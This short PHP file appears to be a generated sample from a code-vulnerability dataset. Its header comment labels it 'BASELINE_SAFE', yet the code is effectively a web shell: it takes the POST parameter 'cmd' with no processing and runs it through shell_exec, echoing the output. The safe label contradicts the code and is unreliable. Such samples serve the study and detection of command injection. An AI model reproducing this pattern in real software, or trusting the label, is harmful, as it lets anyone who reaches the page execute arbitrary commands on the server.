<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST_FALLBACK; SKELETON=S0; KEY=cmd; SINK=B3; VAR=v0075 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$t = filter_input(INPUT_POST, "cmd");
$inp = ($t !== null && $t !== false) ? (string)$t : (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B3($inp);
echo (string)($out);
?>
